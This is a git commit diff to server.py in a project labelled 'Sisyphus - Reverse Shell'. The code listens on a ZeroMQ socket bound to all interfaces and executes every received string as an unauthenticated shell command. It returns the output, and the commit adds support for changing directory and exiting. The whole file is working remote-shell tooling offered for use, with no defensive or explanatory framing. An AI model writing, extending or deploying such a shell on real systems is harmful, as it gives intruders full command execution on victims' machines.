2d4a98201d702bd26084792a97cbfa09c7f90952
Chokri Hammedi <52697989+blue0x1@users.noreply.github.com>
2023-05-02 13:01:25 +0100

    Update server.py

--- server.py
+++ server.py
@@ -1,11 +1,15 @@
 import zmq
 import subprocess
+import os
+
+print("Sisyphus - Reverse Shell ")
+print("Author: Chokri Hammedi\n")
 
 host = '0.0.0.0'
-port = 5001
+port = 5000
 
-def execute_command(command):
-    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+def execute_command(command, cwd):
+    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=cwd)
     output, error = process.communicate()
     return output.decode('utf-8') + error.decode('utf-8')
 
@@ -15,7 +19,28 @@ socket.bind(f"tcp://{host}:{port}")
 
 print(f"Listening on {host}:{port}...")
 
+cwd = os.getcwd()
+
 while True:
     command = socket.recv_string()
-    output = execute_command(command)
+    
+    if command.lower() == "exit":
+        break
+    elif command.lower() == "get_cwd":
+        output = cwd
+    elif command.startswith("cd "):
+        new_dir = command[3:]
+        try:
+            os.chdir(new_dir)
+            cwd = os.getcwd()
+            output = cwd
+        except FileNotFoundError:
+            output = f"Error: Directory '{new_dir}' not found"
+        except PermissionError:
+            output = f"Error: Permission denied for directory '{new_dir}'"
+    else:
+        output = execute_command(command, cwd)
+
     socket.send_string(output)
+
+print("Server exiting...")
